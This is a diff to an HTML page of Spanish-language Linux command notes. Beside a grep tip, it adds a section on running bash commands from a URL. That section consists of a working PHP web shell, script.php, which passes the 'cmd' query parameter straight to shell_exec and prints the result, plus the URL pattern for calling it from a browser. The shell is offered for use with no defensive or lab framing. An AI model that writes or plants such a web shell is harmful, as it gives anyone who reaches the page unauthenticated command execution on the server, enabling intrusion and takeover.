@@ -28,4 +28,16 @@ EOF
 <p class="has-line-data" data-line-start="1" data-line-end="2">Uso del comando grep para encontrar ficheros que contengan un string específico.</p>
 <pre><code class="has-line-data" data-line-start="3" data-line-end="5" class="language-sh">grep -rni <span class="hljs-string">'/directorio/'</span> <span class="hljs-operator">-e</span> <span class="hljs-string">'Texto que queramos buscar'</span>
 </code></pre>
+<h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Ejecutar_comandos_en_bash_desde_la_url_0"></a>Ejecutar comandos en bash desde la url</h4>
+<p class="has-line-data" data-line-start="1" data-line-end="2">Para ello es necesario utilizar un pequeño script en php</p>
+<pre><code class="has-line-data" data-line-start="4" data-line-end="12" class="language-php"><span class="hljs-comment">## Name: script.php</span>
+<span class="hljs-preprocessor">&lt;?php</span>
+    <span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];
+
+    <span class="hljs-variable">$output</span> = shell_exec(<span class="hljs-variable">$command</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;
+<span class="hljs-preprocessor">?&gt;</span>
+</code></pre>
+<p class="has-line-data" data-line-start="13" data-line-end="14">Mediante esta url se pueden ejecutar los comandos desde un navegador:</p>
+<p class="has-line-data" data-line-start="15" data-line-end="16"><code>http://&lt;ip&gt;/script.php?cmd=&lt;command&gt;</code></p>
 </body>
